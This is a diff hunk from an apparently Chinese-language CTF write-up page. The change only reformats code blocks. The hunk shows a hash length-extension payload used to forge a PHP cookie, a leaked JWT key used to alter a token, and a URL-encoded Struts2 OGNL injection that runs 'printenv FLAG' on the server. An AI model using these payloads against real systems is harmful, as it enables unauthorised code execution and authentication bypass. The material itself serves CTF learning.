@@ -934,10 +934,10 @@ if (!empty($_COOKIE[&#34;digest&#34;])) {
 <p><code>$salt</code>长度为14，并且知道hash值</p>
 <p><img src="https://gkjzjh146.github.io/2023_ctf.assets/image-20230801173301055.png" alt="image-20230801173301055"></p>
 <p><code>$password</code> 为</p>
-<p><code>root\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00aaa</code></p>
-<p>编码一下可以得到</p>
-<p><code>root%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%b8%00%00%00%00%00%00%00aaa</code></p>
-<p>可以得到jwt_key:<code>sk-he00lctf3r</code></p>
+<pre tabindex="0"><code>root\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00aaa
+</code></pre><p>编码一下可以得到</p>
+<pre tabindex="0"><code>root%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%b8%00%00%00%00%00%00%00aaa
+</code></pre><p>可以得到jwt_key:<code>sk-he00lctf3r</code></p>
 <p>在jwt.io中改token</p>
 <p>struts2漏洞，直接打就行了</p>
 <pre tabindex="0"><code>%27+%2B+%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew+java.lang.Boolean%28%22false%22%29+%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27printenv+FLAG%27%29.getInputStream%28%29%29%29+%2B+%27
